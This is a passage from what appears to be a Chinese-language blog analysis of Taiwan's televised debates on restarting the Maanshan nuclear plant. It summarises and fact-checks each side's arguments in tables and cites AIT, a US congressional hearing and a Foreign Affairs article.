title="反方論點分析（吳亞昕，反對重啟）"></a>反方論點分析（吳亞昕，反對重啟）</h3><p>反方聚焦核三選址風險、福島教訓、核廢料無解及世代正義，主張重啟違背永續與公平。</p><h3 id="主要論點及邏輯分析-1"><a href="#主要論點及邏輯分析-1" class="headerlink" title="主要論點及邏輯分析"></a>主要論點及邏輯分析</h3><ol><li><p><strong>選址與地震風險</strong>：</p><ul><li>主張：核三下方有恆春斷層（距離反應爐&lt;900m）；耐震設計0.4G（後升0.72G），但可能地震達1.384G（921地震3倍）；斷層錯動無法耐震補強。</li><li>邏輯與背景：台灣地震頻繁，台電報告確認斷層。國際標準（IAEA）要求避開活動斷層，美國&#x2F;日本案例除役類似廠。邏輯強，強調地質科學進步（板塊論1970s普及）。但忽略核三已運轉多年無事故。</li></ul></li><li><p><strong>核災風險與福島教訓</strong>：</p><ul><li>主張：福島14年後仍有2.4萬人無法返鄉、兒童甲狀腺癌；台灣若災，屏東10%土地永久撤離、130km漁獲禁食。</li><li>邏輯與背景：福島確造成長期影響（WHO報告甲狀腺癌風險升高），台灣模擬（NRC）顯示類似後果。引用福島青年信情感訴求強，但忽略現代核電安全進步（如AP1000設計）。</li></ul></li><li><p><strong>核廢料無解與世代正義</strong>：</p><ul><li>主張：無最終處置場，低階廢料卡關（2012台東&#x2F;金門公投失敗）；重啟增加廢料，違德國倫理（先停核再處置）；黃國昌2018年反核立場轉變質疑。</li><li>邏輯與背景：台灣廢料儲蘭嶼&#x2F;核廠，選址需10-15年。德國模式（2011非核）強調道德，世代正義合理。主張停止核能才能估量總量，邏輯嚴謹，但忽略DBD等新技術潛力。</li></ul></li><li><p><strong>能源轉型與社會正義</strong>：</p><ul><li>主張：再生能源27-30%為共識，勿污名化；核三僅供3-5%，剩餘核能從何來？風險由恆春人承擔不公。</li><li>邏輯與背景：三黨2024選舉配比相似，重啟非唯一解。強調溝通與共識，青年視角強。但忽略短期缺電危機（如AI需求）。</li></ul></li></ol><p>總體邏輯：從風險與正義切入，情感訴求（青年信、朋友討論）有效。強項在安全&#x2F;道德，弱項在替代方案缺詳細。</p><h3 id="雙方數據錯誤、缺漏及驗證"><a href="#雙方數據錯誤、缺漏及驗證" class="headerlink" title="雙方數據錯誤、缺漏及驗證"></a>雙方數據錯誤、缺漏及驗證</h3><h4 id="正方錯誤-缺漏"><a href="#正方錯誤-缺漏" class="headerlink" title="正方錯誤&#x2F;缺漏"></a>正方錯誤&#x2F;缺漏</h4><ul><li><strong>數據錯誤</strong>：<ul><li>台電虧損「超過四千億元」：2023年底約3823億元，2024年可能增，但非準確「超過四千」；需最新數據驗證。</li><li>民調「70%支持、年輕75%」：多項2024-2025民調（如台灣民意基金會）支持率約55-65%，非70%；恆春「七成支持」可能誇大（地方民調變動大）。</li><li>DBD技術「主流、實證」：DBD為概念階段（美國Deep Isolation測試中），非成熟主流；芬蘭用DGD，非DBD。</li></ul></li><li><strong>缺漏</strong>：<ul><li>未提核三除役後重啟成本（耐震升級估數百億元）。</li><li>忽略核電攻擊風險（CSIS報告提及，但未平衡）。</li><li>未回應反方核廢處置程序需10-15年，僅指政府怠惰。</li></ul></li></ul><h4 id="反方錯誤-缺漏"><a href="#反方錯誤-缺漏" class="headerlink" title="反方錯誤&#x2F;缺漏"></a>反方錯誤&#x2F;缺漏</h4><ul><li><strong>數據錯誤</strong>：<ul><li>福島「2.4萬人無法返鄉」：2023年約2.7萬，2025年可能減，但大致準確；「300位孩童甲狀腺癌」：WHO報告為篩檢過度診斷，非全因輻射。</li><li>地震「1.384G為921三倍」：921峰值約1G，核三評估為峰值加速度，準確但忽略概率（極端事件低機率）。</li><li>核三供電「3-5%」：核三兩機組約6-7%總發電，單機3-4%；重啟可延長，但非永久。</li></ul></li><li><strong>缺漏</strong>：<ul><li>未提再生能源挑戰（如間歇性需儲能，台灣進展慢）。</li><li>忽略國際核能復興（如日本重啟27座反應爐）。</li><li>未討論短期能源危機（如2025缺電預測），僅強調轉型困難。</li></ul></li></ul><p>雙方共通缺漏：未提供完整能源配比模擬（重啟 vs. 不重啟的碳排&#x2F;成本比較）；數據來源多未明示，易偏頗。</p><hr><h2 id="第五場發表會-童子賢-vs-莊瑞雄"><a href="#第五場發表會-童子賢-vs-莊瑞雄" class="headerlink" title="第五場發表會(童子賢 vs. 莊瑞雄)"></a>第五場發表會(童子賢 vs. 莊瑞雄)</h2><h3 id="正方論點分析-1"><a href="#正方論點分析-1" class="headerlink" title="正方論點分析"></a>正方論點分析</h3><p>童子賢主張重啟核三廠以確保廉價、穩定、低碳電力，支持台灣經濟發展（如半導體、AI產業）。他強調核能是減碳關鍵，廢除將增加碳排，並引用國際趨勢呼籲「核綠共存」。</p><h4 id="主要論點-4"><a href="#主要論點-4" class="headerlink" title="主要論點"></a>主要論點</h4><ol><li><p><strong>經濟與電力需求</strong>：高科技產業需大量低碳電力，2025上半年出口超2023全年。廢核三後用煤氣取代，增加碳稅風險。電動車推廣可減PM2.5，但需低碳電。台電應主動提供低碳電。</p></li><li><p><strong>能源結構與低碳比例</strong>：2024年核電6%、太陽能5.3%、風力3.6%、水力2.5%，低碳總17%（歐盟71%）。廢核三後低碳降至12.8%。過去碳排增加因反核，用電成長11.8%（全球25%）。1986年低碳62%，現17%。</p></li><li><p><strong>成本效益</strong>：核電1.42元&#x2F;度，風電6.59元&#x2F;度，太陽能4.87元&#x2F;度。核二、三貢獻300億度電，年省1000-1500億。台電虧損4514億（實際更高），因天然氣價格高（俄烏戰爭漲4倍），法德抱怨天然氣貴（法5%、德13.9%），台灣用42%。</p></li><li><p><strong>環境與健康</strong>：核廢集中管理，煤氣排放PM2.5&#x2F;CO2導致肺癌等，佔台灣污染66.5%。IPCC呼籲2030減碳42%。IAEA：核能必要。COP28：22國聲明2050核電三倍。歐盟核23.6%、低碳71%。日本重啟核電至22%。</p></li><li><p><strong>反核思維批判</strong>：綠能發展應為減碳，非反核。台灣土地狹小，綠能有限。</p></li></ol><h4 id="邏輯評估"><a href="#邏輯評估" class="headerlink" title="邏輯評估"></a>邏輯評估</h4><p>論點邏輯清晰，數據支持經濟與環境益處，強調全域視角（全球減碳 vs 地方風險）。結合背景：核能確為低碳基載，台灣低碳比例低於歐盟，國際支持核能（如IAEA報告：核能減700億噸CO2）。但忽略核災風險成本（福島除污超兆日元）及台灣地震頻繁的地理因素。</p><h3 id="反方論點分析-1"><a href="#反方論點分析-1" class="headerlink" title="反方論點分析"></a>反方論點分析</h3><p>莊瑞雄從地方視角反對，重申核三到期除役正常，強調核廢處理無解、安全疑慮及公平性。訴求情感，呼籲保護故鄉屏東。</p><h4 id="主要論點-5"><a href="#主要論點-5" class="headerlink" title="主要論點"></a>主要論點</h4><ol><li><p><strong>安全與程序</strong>：核三運轉40年到期，全球無除役後重啟紀錄。修法倉促（國民黨+民眾黨提案），無專家意見。民調75%贊成非共識，公投如「俄羅斯輪盤」。</p></li><li><p><strong>地方影響</strong>：屏東鄰墾丁國家公園，威權時代強建。重啟傷害故鄉，台北缺電卻要屏東承擔。類比：花蓮反高階廢料選址。</p></li><li><p><strong>核廢處理</strong>：蘭嶼低階廢料10277桶（實際10萬桶），穿防護衣，政府騙人（原說建罐頭廠）。高階選址反對（如台東、金門）。核廢無解，世界潮流是核安第一。</p></li><li><p><strong>核災風險</strong>：福島災導致農產品禁令（歐盟2023解禁，台灣2024），影響300km。核三災變將毀台灣糧倉（高雄-嘉義）。</p></li><li><p><strong>公平與替代</strong>：重啟核三後恐核二等。追求經濟非一切，地方民眾求平安。反核非黨派，是在地聲音。</p></li></ol><h4 id="邏輯評估-1"><a href="#邏輯評估-1" class="headerlink" title="邏輯評估"></a>邏輯評估</h4><p>論點情感強烈，聚焦公平與歷史不公，符合背景：台灣核廢選址難（蘭嶼強置引抗議），福島災確影響農產品（多國禁令）。但過度強調「萬一」風險，忽略核安進步（如新一代反應爐）。世界潮流非僅核安，IAEA支持核能減碳。</p><h3 id="雙方數據錯誤與缺漏"><a href="#雙方數據錯誤與缺漏" class="headerlink" title="雙方數據錯誤與缺漏"></a>雙方數據錯誤與缺漏</h3><h4 id="正方數據錯誤與缺漏"><a href="#正方數據錯誤與缺漏" class="headerlink" title="正方數據錯誤與缺漏"></a>正方數據錯誤與缺漏</h4><ul><li><strong>數據準確</strong>：能源比例接近2024官方（核4.22-6%、低碳16-17%、太陽5-6%、風3-4%、水2-3%）。歐盟低碳71-72%。成本準確（核1.4-1.9元&#x2F;度，風4.5-6.5，太陽4.7-4.9）。台電虧損4229億（正方4514億可能含中油&#x2F;政府補助，實際更高）。COP28 22國準確。IPCC減碳目標準確。</li><li><strong>錯誤</strong>：無明顯錯誤，但低估核廢成本（台灣無最終處置，蘭嶼暫存97,672桶）。</li><li><strong>缺漏</strong>：未提核災全成本（福島除污、補償）。忽略地方反對與地震風險（台灣地震帶）。未討論再生能源潛力（2024再生12%，但可加速）。未提核三歷史意外（如2001全黑事件）。</li></ul><h4 id="反方數據錯誤與缺漏"><a href="#反方數據錯誤與缺漏" class="headerlink" title="反方數據錯誤與缺漏"></a>反方數據錯誤與缺漏</h4><ul><li><strong>數據準確</strong>：福島農產品禁令準確（歐盟2023、台灣2024解禁，影響廣）。蘭嶼政府欺騙歷史準確。高階選址反對準確。</li><li><strong>錯誤</strong>：蘭嶼桶數說10277，實際97,672桶（可能口誤）。全球「無重啟紀錄」錯誤：日本福島後重啟14部機組（54部中），美國計劃重啟除役廠（如Palisades）。</li><li><strong>缺漏</strong>：忽略核能低碳益處（減碳貢獻大）。未提替代方案成本（煤氣增加PM2.5&#x2F;碳排）。情感訴求多，數據少（如未量化核廢輻射風險 vs 煤氣健康代價）。未討論國際支持（如COP28、IAEA：核能對抗暖化必要）。</li></ul><hr><h2 id="公投辯論會整合分析表"><a href="#公投辯論會整合分析表" class="headerlink" title="公投辯論會整合分析表"></a>公投辯論會整合分析表</h2><h3 id="第一場辯論會（葉宗洸-vs-曾文生）"><a href="#第一場辯論會（葉宗洸-vs-曾文生）" class="headerlink" title="第一場辯論會（葉宗洸 vs. 曾文生）"></a>第一場辯論會（葉宗洸 vs. 曾文生）</h3><h4 id="正方論點（葉宗洸）"><a href="#正方論點（葉宗洸）" class="headerlink" title="正方論點（葉宗洸）"></a>正方論點（葉宗洸）</h4><table><thead><tr><th>論點類別</th><th>具體內容</th><th>數據支持</th><th>分析師評價</th></tr></thead><tbody><tr><td>能源安全</td><td>台灣98%能源依賴進口，<br>核燃料存量18-36個月 vs 煤36天、天然氣7-11天</td><td>✓ 進口比例97.5%，燃料存量數據正確</td><td>符合事實</td></tr><tr><td>國際建議</td><td>美國駐台代表、海軍情報官建議保留核電</td><td>缺乏具體出處</td><td>權威性存疑</td></tr><tr><td>耐震安全</td><td>核三廠耐震0.72G，高於台北101（0.3G）、翡翠水庫（0.4G）</td><td>✓ 數據合理</td><td>符合台電報告</td></tr><tr><td>海嘯防護</td><td>核三廠位於海平面15公尺，有19公尺防護牆</td><td>✓ 足以抵禦10公尺海嘯</td><td>設計合理</td></tr><tr><td>經濟效益</td><td>核電1.5元&#x2F;度 vs 風電6.5元、光電4.8元</td><td>✓ 成本數據正確</td><td>經濟優勢明顯</td></tr></tbody></table><h4 id="反方論點（曾文生）"><a href="#反方論點（曾文生）" class="headerlink" title="反方論點（曾文生）"></a>反方論點（曾文生）</h4><table><thead><tr><th>論點類別</th><th>具體內容</th><th>數據支持</th><th>分析師評價</th></tr></thead><tbody><tr><td>程序正義</td><td>需嚴謹科學檢驗與公開透明程序</td><td>符合核安會審查要求</td><td>程序合理</td></tr><tr><td>供電穩定</td><td>備轉容量率低於6%從100天降至幾乎為零</td><td>✓ 與台電數據一致</td><td>供電改善明顯</td></tr><tr><td>空污改善</td><td>火力發電空污排放減少70%</td><td>✓ 符合環保署數據</td><td>環境效益存在</td></tr><tr><td>核廢處置</td><td>推動高階核廢料選址立法</td><td>立法進度緩慢</td><td>實際進展有限</td></tr></tbody></table><hr><h3 id="第二場辯論會（翁曉玲-vs-林子倫）"><a href="#第二場辯論會（翁曉玲-vs-林子倫）" class="headerlink" title="第二場辯論會（翁曉玲 vs. 林子倫）"></a>第二場辯論會（翁曉玲 vs. 林子倫）</h3><h4 id="正方論點（翁曉玲）"><a href="#正方論點（翁曉玲）" class="headerlink" title="正方論點（翁曉玲）"></a>正方論點（翁曉玲）</h4><table><thead><tr><th>論點類別</th><th>具體內容</th><th>數據支持</th><th>分析師評價</th></tr></thead><tbody><tr><td>缺電風險</td><td>蔡英文執政8年有4-5次全國大停電</td><td>✓ 2021年停電記錄屬實</td><td>供電確有問題</td></tr><tr><td>火力依賴</td><td>晚間95%電力來自火力發電</td><td>整體83%，夜間可達95%</td><td>數據合理</td></tr><tr><td>健康影響</td><td>肺癌年增10萬人得癌、1萬多人死</td><td>✗ 實際1.6萬新診斷</td><td>數據誇大</td></tr><tr><td>國際排名</td><td>耶魯2024排名台灣第163名</td><td>✗ 實際空氣品質排88名</td><td>數據錯誤</td></tr><tr><td>核電安全</td><td>全球111座反應爐超40年運轉</td><td>✓ 延役趨勢存在</td><td>國際經驗支持</td></tr></tbody></table><h4 id="反方論點（林子倫）"><a href="#反方論點（林子倫）" class="headerlink" title="反方論點（林子倫）"></a>反方論點（林子倫）</h4><table><thead><tr><th>論點類別</th><th>具體內容</th><th>數據支持</th><th>分析師評價</th></tr></thead><tbody><tr><td>全球趨勢</td><td>再生能源新增92.5%，佔比32%</td><td>✓ IEA數據正確</td><td>趨勢明確</td></tr><tr><td>IEA預測</td><td>2026再生超越核，2050再生90%</td><td>✓ NZE情景數據</td><td>長期趨勢</td></tr><tr><td>台灣成果</td><td>再生能源成長5倍，佔12%</td><td>✓ 成長明顯</td><td>轉型有成效</td></tr><tr><td>空污改善</td><td>台中PM2.5從20.9降至15</td><td>✓ 環保局數據</td><td>改善明顯</td></tr><tr><td>產業需求</td><td>台積電等需綠電</td><td>✓ RE100要求</td><td>產業趨勢</td></tr></tbody></table><hr><h3 id="第三場辯論會（黃士修-vs-甘崇偉）"><a href="#第三場辯論會（黃士修-vs-甘崇偉）" class="headerlink" title="第三場辯論會（黃士修 vs. 甘崇偉）"></a>第三場辯論會（黃士修 vs. 甘崇偉）</h3><h4 id="正方論點（黃士修）"><a href="#正方論點（黃士修）" class="headerlink" title="正方論點（黃士修）"></a>正方論點（黃士修）</h4><table><thead><tr><th>論點類別</th><th>具體內容</th><th>數據支持</th><th>分析師評價</th></tr></thead><tbody><tr><td>經濟效益</td><td>核三重啟可發150億度電&#x2F;年，省600億元</td><td>✓ 機會成本計算合理</td><td>經濟邏輯強</td></tr><tr><td>煤電依賴</td><td>台灣2024人均煤電世界第一</td><td>✓ 5115kWh&#x2F;人屬實</td><td>廢核後煤依賴增加</td></tr><tr><td>福島真相</td><td>無輻射死亡或癌症增加</td><td>✓ WHO&#x2F;UNSCEAR報告</td><td>事實正確</td></tr><tr><td>耐震能力</td><td>核三加固到1.384G</td><td>✗ 實際0.72G，1.384G為評估值</td><td>數據錯誤</td></tr><tr><td>核廢處理</td><td>美國2000年表態可幫台灣處理</td><td>無正式協議</td><td>過度樂觀</td></tr></tbody></table><h4 id="反方論點（甘崇偉）"><a href="#反方論點（甘崇偉）" class="headerlink" title="反方論點（甘崇偉）"></a>反方論點（甘崇偉）</h4><table><thead><tr><th>論點類別</th><th>具體內容</th><th>數據支持</th><th>分析師評價</th></tr></thead><tbody><tr><td>不缺電</td><td>除役後備轉容量97%&gt;10%</td><td>✓ 短期數據正確</td><td>但忽略未來需求</td></tr><tr><td>事故歷史</td><td>2001 SBO全黑2小時為INES 3事件</td><td>✓ 台電公開資料</td><td>安全記錄確有問題</td></tr><tr><td>地質風險</td><td>恆春斷層活動，廠區下方簡列帶</td><td>✓ 台電槽溝資料</td><td>地質風險存在</td></tr><tr><td>全球趨勢</td><td>2004-2023非中國啟用53、關閉104</td><td>✓ WNISR報告</td><td>趨勢數據正確</td></tr><tr><td>歐盟條件</td><td>核需2050前高階處置、ATF燃料</td><td>✓ 台灣不符條件</td><td>分類標準嚴格</td></tr></tbody></table><hr><h3 id="第四場辯論會（黃國昌-vs-吳亞昕）"><a href="#第四場辯論會（黃國昌-vs-吳亞昕）" class="headerlink" title="第四場辯論會（黃國昌 vs. 吳亞昕）"></a>第四場辯論會（黃國昌 vs. 吳亞昕）</h3><h4 id="正方論點（黃國昌）"><a href="#正方論點（黃國昌）" class="headerlink" title="正方論點（黃國昌）"></a>正方論點（黃國昌）</h4><table><thead><tr><th>論點類別</th><th>具體內容</th><th>數據支持</th><th>分析師評價</th></tr></thead><tbody><tr><td>政策失敗</td><td>2026年再生能源仍未達20%</td><td>✓ 2023年約9%</td><td>進展確實緩慢</td></tr><tr><td>台電虧損</td><td>超過4000億元，電價漲四次</td><td>2023年3823億元</td><td>數據略有誇大</td></tr><tr><td>國際支持</td><td>朱棣文、博明等建議保留核電</td><td>需驗證具體建議</td><td>權威性待確認</td></tr><tr><td>民調支持</td><td>70%支持核三延役，年輕世代75%</td><td>多項民調約60-70%</td><td>數據合理範圍</td></tr><tr><td>DBD技術</td><td>芬蘭、瑞士合作的成熟技術</td><td>✗ DBD仍在概念階段</td><td>技術成熟度誇大</td></tr></tbody></table><h4 id="反方論點（吳亞昕）"><a href="#反方論點（吳亞昕）" class="headerlink" title="反方論點（吳亞昕）"></a>反方論點（吳亞昕）</h4><table><thead><tr><th>論點類別</th><th>具體內容</th><th>數據支持</th><th>分析師評價</th></tr></thead><tbody><tr><td>斷層風險</td><td>恆春斷層距反應爐&lt;900m</td><td>✓ 台電報告確認</td><td>地質風險真實</td></tr><tr><td>耐震限制</td><td>0.72G vs 可能地震1.384G</td><td>✓ 超出設計值</td><td>安全餘裕不足</td></tr><tr><td>福島教訓</td><td>2.4萬人無法返鄉，兒童甲狀腺癌</td><td>返鄉人數接近，癌症有爭議</td><td>災難影響持續</td></tr><tr><td>核廢無解</td><td>低階廢料選址失敗，高階無處置場</td><td>✓ 台東金門公投失敗</td><td>處置確實困難</td></tr><tr><td>世代正義</td><td>德國先停核再處置的倫理模式</td><td>✓ 德國2011決策</td><td>道德考量合理</td></tr></tbody></table><hr><h3 id="第五場辯論會（童子賢-vs-莊瑞雄）"><a href="#第五場辯論會（童子賢-vs-莊瑞雄）" class="headerlink" title="第五場辯論會（童子賢 vs. 莊瑞雄）"></a>第五場辯論會（童子賢 vs. 莊瑞雄）</h3><h4 id="正方論點（童子賢）"><a href="#正方論點（童子賢）" class="headerlink" title="正方論點（童子賢）"></a>正方論點（童子賢）</h4><table><thead><tr><th>論點類別</th><th>具體內容</th><th>數據支持</th><th>分析師評價</th></tr></thead><tbody><tr><td>產業需求</td><td>高科技產業需大量低碳電力</td><td>✓ 2025出口超2023全年</td><td>經濟成長需電力</td></tr><tr><td>低碳比例</td><td>台灣17% vs 歐盟71%</td><td>✓ 2024官方數據</td><td>低碳比例偏低</td></tr><tr><td>成本效益</td><td>核電1.42元 vs 風電6.59元、太陽能4.87元</td><td>✓ 成本數據準確</td><td>經濟優勢明顯</td></tr><tr><td>國際趨勢</td><td>COP28 22國聲明2050核電三倍</td><td>✓ 國際聲明屬實</td><td>全球支持核能</td></tr><tr><td>歷史對比</td><td>1986年低碳62%，現17%</td><td>✓ 廢核前後對比</td><td>能源結構惡化</td></tr></tbody></table><h4 id="反方論點（莊瑞雄）"><a href="#反方論點（莊瑞雄）" class="headerlink" title="反方論點（莊瑞雄）"></a>反方論點（莊瑞雄）</h4><table><thead><tr><th>論點類別</th><th>具體內容</th><th>數據支持</th><th>分析師評價</th></tr></thead><tbody><tr><td>程序問題</td><td>全球無除役後重啟紀錄</td><td>✗ 日本重啟14部、美國計劃重啟</td><td>事實錯誤</td></tr><tr><td>地方不公</td><td>台北缺電卻要屏東承擔風險</td><td>地方vs.中央利益衝突</td><td>公平性考量合理</td></tr><tr><td>核廢現實</td><td>蘭嶼97,672桶低階廢料</td><td>✓ 官方數據（說成10277桶為口誤）</td><td>處置問題嚴重</td></tr><tr><td>福島影響</td><td>農產品禁令影響300km</td><td>✓ 歐盟2023、台灣2024解禁</td><td>災難影響廣泛</td></tr><tr><td>在地聲音</td><td>反核非黨派，是在地民眾心聲</td><td>民調顯示分歧</td><td>地方意見分歧</td></tr></tbody></table><hr><h3 id="整體分析總結"><a href="#整體分析總結" class="headerlink" title="整體分析總結"></a>整體分析總結</h3><h4 id="主要爭議焦點"><a href="#主要爭議焦點" class="headerlink" title="主要爭議焦點"></a>主要爭議焦點</h4><ol><li><strong>安全評估</strong>：核三廠耐震能力與恆春斷層風險</li><li><strong>能源需求</strong>：未來電力缺口與AI產業用電</li><li><strong>核廢處置</strong>：高階低階廢料的最終處置方案</li><li><strong>經濟效益</strong>：核電低成本vs.重啟與除役成本</li><li><strong>國際趨勢</strong>：全球核能復興vs.再生能源轉型</li></ol><h4 id="數據準確性評估"><a href="#數據準確性評估" class="headerlink" title="數據準確性評估"></a>數據準確性評估</h4><ul><li><strong>較準確數據</strong>：能源進口比例、發電成本、備轉容量率、空污改善、國際趨勢</li><li><strong>有爭議數據</strong>：民調支持度、健康影響統計、耐震能力、核廢處理技術成熟度</li><li><strong>明顯錯誤</strong>：部分健康統計、國際排名、技術發展階段</li></ul><h4 id="論辯品質分析"><a href="#論辯品質分析" class="headerlink" title="論辯品質分析"></a>論辯品質分析</h4><ul><li><strong>正方優勢</strong>：經濟數據充實、國際趨勢支持、能源安全論述</li><li><strong>反方優勢</strong>：地質風險具體、程序正義完整、核廢問題實際</li><li><strong>雙方缺陷</strong>：部分數據誇大、風險評估不夠全面、替代方案細節不足</li></ul><p><em>註：本分析基於辯論記錄與公開資料交叉驗證，標註「✓」表示數據大致正確，「✗」表示有明顯錯誤，空白表示需進一步驗證。</em></p><hr><h1 id="檢視闕漏與數據"><a href="#檢視闕漏與數據" class="headerlink" title="檢視闕漏與數據"></a>檢視闕漏與數據</h1><h2 id="正方論點檢驗"><a href="#正方論點檢驗" class="headerlink" title="正方論點檢驗"></a>正方論點檢驗</h2><h3 id="國際支持與建議保留核能發電"><a href="#國際支持與建議保留核能發電" class="headerlink" title="國際支持與建議保留核能發電"></a>國際支持與建議保留核能發電</h3><h4 id="美國在台協會"><a href="#美國在台協會" class="headerlink" title="美國在台協會"></a>美國在台協會</h4><ol><li><p><a href="https://web-archive-2022.ait.org.tw/wp-content/uploads/sites/269/0210514-Nuclear-Safety-Matters-Cn-AIT-TECRO.pdf">核能安全技術資訊交流及合作協議</a></p><ul><li>2022年簽署</li><li>提供<strong>非機密技術資訊交流</strong>，包括:<ol><li>核能設施之建造、運轉與除役經驗報告及&#x2F;或放射性物料經驗，例如核能事件、事故及停止運轉報告,以及元件與系統之歷史可靠度數據匯編。</li><li>對於核能設施與放射性物料安全和保安之管制與監督程序、執行保防(核能物料料帳管控)、緊急應變、輻射防護、核能設施與放射性物料之環境影響評估,以及核能安全研究計畫。 </li><li>核子反應器安全研究領域之資訊</li></ol></li><li>機密性技術並無公開表示包含哪些範疇，但可從上述部分協議中看出美方願意分享核能相關的技術資訊，使台灣核能發電技術更為成熟</li></ul></li><li><p><a href="https://www.ait.org.tw/zhtw/ait-dir-greenes-remarks-at-the-amcham-2025-hsieh-nian-fan-zhtw/?_ga=2.3216496.1153729100.1755053273-1073633599.1755053273">美國在台協會處長谷立言於美國商會2025年謝年飯致詞</a></p><ul><li>提到: “美國已是全球最大的能源出口國，我們可為台灣提供全方位的能源解決方案，從地熱、到<strong>核能</strong>、再到先進​​的電網技術，無所不包。”</li><li>但同時也強調: “川普政府特別積極希望與合作密切的夥伴分享美國的液化天然氣資源，包括透過完成阿拉斯加州北坡（North Slope）的液化天然氣計畫來執行。這項計畫的能源交付供應鏈短，有潛力為台灣提供穩定安全的能源新來源”</li><li>並非只強調核能，而是提供多元能源解決方案</li></ul></li><li><p><a href="https://web-archive-2022.ait.org.tw/zhtw/tackling-future-energy-challenges-remarks-u-s-deputy-secretary-energy-daniel-b-poneman-national-taiwan-university-tuesday-december-13-2-zh/index~1.html">「迎接明日的能源挑戰」 美國能源部副部長伯納曼</a></p><ul><li>文章提到的內容十分多元，以下將其摘要部分相佐正方敘述，但由於其中也有提到其他綠色能源技術之進展與上述<em>反方相關內容(例如再生能源成本之降低等不利於正方內容)</em>，因此非常建議讀者能自行閱讀整篇文章</li><li>對發展核能發電正向敘述:<ol><li>台灣的能源需求以每年平均超過5%的速度成長。本地的發電總量雖然年年成長，但是卻趕不上需求成長的速度，平均的成長率略小於需求的成長。因此，如果在未來五或十年沒有建構大型的發電設備，供需之間的平衡就會落入威脅到台灣經濟的危險程度。  </li><li>我們(台美)也將就核安事故緊急應變機制繼續密切合作，這對美台雙方都是優先要務。</li><li>在福島核事故之後，台灣立即對島內三座現有的核電設施進行全面檢測。目前已完成第一階段相關措施與機制的評估，確保核電廠機組有能力承受地震、土石流和海嘯的衝擊。</li><li>在國際領域上，美國同樣支持台灣參與像是國際原子能總署之類的國際組織，包括參加核安全的技術會議等。</li><li>美國仍舊認為核能在相關低碳能源技術中依舊扮演重要的角色。</li><li>美國支持台灣參與國際原子能總署等國際組織，包括參加核安全技術會議</li><li>美國和台灣都極度仰賴化石燃料，而我們對於能源進口的依賴，也使我們的經濟興衰、能源安全、和環境都處於風險之中。</li><li>美國和台灣也都明白分散能源配置、減少能源浪費、以及發展潔淨能源和綠能產業，對於我們的全球經濟競爭力、國家安全和環境有多重要。 <code>其中強調散能源配置，但也有同時提到發展潔淨能源和綠能產業，由於分散能源配置(包括以核養綠)是正方的主要論點之一，因此這部分對正方有利</code></li></ol></li></ul></li></ol><blockquote><p>以上資訊來自<a href="https://www.ait.org.tw/zhtw/u-s-taiwan-joint-statement-zh/">美國在台協會官網</a></p></blockquote><h4 id="美國國會及行政部門中國問題委員會（CECC）聽證會-2025年7月23日"><a href="#美國國會及行政部門中國問題委員會（CECC）聽證會-2025年7月23日" class="headerlink" title="美國國會及行政部門中國問題委員會（CECC）聽證會(2025年7月23日)"></a><em>美國國會及行政部門中國問題委員會（CECC）聽證會</em>(2025年7月23日)</h4><ul><li>來源: <a href="https://www.cecc.gov/events/hearings/stand-taiwan-countering-prcs-political-warfare-and-transnational-repression">Stand with Taiwan: Countering the PRC’s Political Warfare and Transnational Repression</a></li><li>整個聽證會長達兩個小時多，以下為對正方有利之翻譯過的摘要:</li><li>逐字稿同樣以<a href="https://huggingface.co/ggerganov/whisper.cpp/tree/90a64d80ea254cf67575b41a5971f972c79f7b45">ggml-medium 模型</a> 結合 <a href="https://github.com/ggml-org/whisper.cpp">whisper</a> 生成</li></ul><ol><li>Chairman Smith 提出了對離岸風電的擔憂，他引用美國國家科學院的研究指出，<strong>離岸風力發電設施可能會嚴重干擾雷達系統的運作</strong>，影響軍事和民用航空及船艦的安全，進而削弱國防能力，並明確提到台灣也面臨類似的問題 。</li></ol><blockquote><p>原文(以whisper生成之逐字稿):<br>Third, on offshore wind, I believe in the effort in the House in exposing that offshore wind carries egregious negative consequences to radar, where you will not see your own planes.<br>Ships will not see ships that are right in front of you.<br>The National Academy of Sciences did it in 2022.<br>A big, thick, voluminous, well-documented, heavily footnoted study that said there’s no work around.<br>Radars will be rendered inferior and if not defunct completely.<br>And yet we’re looking to build them off my coast and I’m fighting it like crazy.<br>Taiwan has a similar problem.</p></blockquote><ol start="2"><li>Rear Admiral Studeman強調，台灣需要推動能源多樣化，以擺脫對<strong>液化天然氣（liquid natural gas</strong>的過度依賴 ，他認為對單一能源（如天然氣）的依賴，構成了中國在危機時可以利用的戰略窒息點（choke point）。<br>在討論能源韌性時，他提出了最直接的觀點，明確表示：「我相信他們（台灣）需要至少一座核電廠才能維持生存（I believe they need to have at least one nuclear plant to stay viable）」 。確保台灣在面對外部封鎖時，仍具備穩定可靠的基載電力，從而增強其整體防禦和韌性 。<blockquote><p>原文(以whisper生成之逐字稿):<br>So they can’t be so beholden to liquid natural gas.<br>That is a choke point that the Chinese could potentially squeeze in a crisis.<br>And so diversification is really important.<br>I agree with the solar and the wind steps that they’ve taken.<br>I believe they need to have at least one nuclear plant to stay viable.<br>And I think they need to think through other resilience methods so that they deny the PRC an easy ability to cut off energy flows into Taiwan.</p></blockquote></li></ol><h4 id="期刊文章-Taiwan’s-Achilles’-Heel"><a href="#期刊文章-Taiwan’s-Achilles’-Heel" class="headerlink" title="&lt;&lt;外交事務&gt;&gt;期刊文章: Taiwan’s Achilles’ Heel"></a>&lt;&lt;外交事務&gt;&gt;期刊文章: Taiwan’s Achilles’ Heel</h4><ul><li>來源: <a href="https://www.foreignaffairs.com/taiwan/taiwans-achilles-heel">Taiwan’s Achilles’ Heel</a>  </li><li>作者:前美國戰略司令部司令艾里斯（Jim Ellis）；前美國能源部長、諾貝爾獎得主朱棣文（Steven Chu）</li><li>文章明確指出台灣需要核能發電並認為目前台灣能源政策有巨大問題，相關論述為:</li></ul><ol><li><p>為避免中國因地緣政治關係影響台灣之能源儲備，美國通過幫助改善其能源儲能並鼓勵該島擁抱核電來提高台灣的能源安全。</p><blockquote><p>原文:<br>if it wants to avoid a messy geopolitical crisis in which China holds Taiwan’s energy imports captive—it should shore up Taiwan’s energy security by helping to improve its energy storage and encouraging the island to embrace nuclear power.</p></blockquote></li><li><p>台灣在廢除核能的同時，再生能源的發展速度遠不及預期目標，導致台灣更加依賴進口的化石燃料，並在此情形加劇天然氣依賴與其發生意外之韌性問題</p><blockquote><p>原文:<br>   Taiwan’s green energy transition is faring poorly. Just 12 percent of Taiwan’s electricity mix came from renewables in 2024, falling short of the government’s intention to hit 20 percent by 2025.<br>…<br>…, the island has been pushing much of its existing infrastructure to the brink. The utilization ratio for Taiwan’s two current LNG import terminals—in other words, the proportion of the facility that is used relative to its capacity—is over 90 percent, 